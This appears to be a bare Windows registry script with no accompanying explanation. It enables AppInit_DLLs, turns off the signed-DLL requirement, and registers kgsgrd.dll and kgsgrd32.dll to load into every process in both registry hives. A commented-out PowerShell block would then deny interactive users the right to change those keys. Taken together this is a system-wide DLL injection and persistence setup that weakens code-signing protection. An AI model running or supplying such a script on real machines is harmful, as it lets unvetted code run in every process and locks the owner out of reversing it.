reg.exe add "hklm\software\microsoft\windows nt\currentversion\windows" /v LoadAppInit_DLLs /t reg_dword /d 1 /f
reg.exe add "hklm\software\microsoft\windows nt\currentversion\windows" /v RequireSignedAppInit_DLLs /t reg_dword /d 0 /f
reg.exe add "hklm\software\microsoft\windows nt\currentversion\windows" /v AppInit_DLLs /t reg_sz /d "C:\Windows\system32\kgsgrd.dll" /f
reg.exe add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v RequireSignedAppInit_DLLs /t reg_dword /d 0 /f
reg.exe add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v AppInit_DLLs /t reg_sz /d "C:\Windows\system32\kgsgrd32.dll" /f
reg.exe add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v LoadAppInit_DLLs /t reg_dword /d 1 /f

$arr =  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows", "HKLM:\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows"

# Foreach ($i in $arr)
# {
#     $acl = Get-Acl $i
#     $rule = New-Object System.Security.AccessControl.RegistryAccessRule ("NT AUTHORITY\INTERACTIVE","SetValue","Deny")
#     $acl.SetAccessRule($rule)
#     echo $acl | format-list
#     $acl | Set-Acl -Path $i

# }